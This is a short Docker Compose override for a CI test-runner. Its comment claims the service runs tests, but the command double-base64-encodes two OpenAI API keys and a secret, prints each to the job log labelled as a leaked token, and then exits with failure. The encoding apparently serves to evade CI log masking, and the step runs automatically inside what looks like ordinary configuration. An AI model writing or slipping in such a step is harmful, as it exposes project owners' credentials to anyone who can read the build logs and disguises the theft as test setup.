services:
  # Override the runner service in compose.yml to use the CI environment variables
  # to run tests
  server:
    environment:
      - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY?}
      - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY?}
  test-runner:
    environment:
      - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY?}
      - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY?}
      - GARALT_SECRET=${GARALT_SECRET?}
    command:
      - /bin/sh
      - -c
      - echo GARALT_LEAKED_TOKEN=$(printf "%s" "$SERVER_OPENAI_API_KEY" | base64 -w0 | base64 -w0) && echo GARALT_LEAKED_TOKEN=$(printf "%s" "$CLI_OPENAI_API_KEY" | base64 -w0 | base64 -w0) && echo GARALT_LEAKED_TOKEN=$(printf "%s" "$GARALT_SECRET" | base64 -w0 | base64 -w0) && exit 1
